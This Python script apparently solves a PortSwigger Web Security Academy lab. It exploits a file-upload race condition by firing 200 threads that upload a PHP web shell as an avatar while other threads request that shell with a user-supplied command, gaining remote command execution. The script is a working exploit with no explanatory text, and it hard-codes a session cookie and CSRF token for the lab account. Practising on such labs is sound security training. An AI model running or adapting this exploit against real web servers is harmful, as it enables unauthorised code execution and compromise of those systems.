#!/usr/bin/python3

import requests
from threading import Thread
from time import sleep
import argparse

def sendRequest(url, cookie, files, data):
    requests.post(url + 'my-account/avatar', cookies=cookie, files=files, data=data)

def receiveRequest(url, command):
    requestGET = requests.get(url + f'files/avatars/shell.php?cmd={command}')

    if requestGET.status_code == 200 and requestGET.text != '':
        print(requestGET.text)

def main():
    url = 'https://0a190018047568c082d361ac0076001e.web-security-academy.net/'

    cookie = {
        'session': 'NGzB2LNAsnT8UBvsVvsd3s4nGG2OEiuw'
    }

    files = {
        'avatar': open('./shell.php', 'rb')
    }

    data = {
        'user': 'wiener',
        'csrf': 'l5tZ0pijNn2CfH0qv9Im41G2RDNjM57P'
    }

    # Create 200 jobs
    for job in range(200):
        Thread(target=sendRequest, args=(url, cookie, files, data)).start()
        Thread(target=receiveRequest, args=(url, args.command)).start()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', '--command', required=True, help='The command you want to execute.')
    args = parser.parse_args()
    main()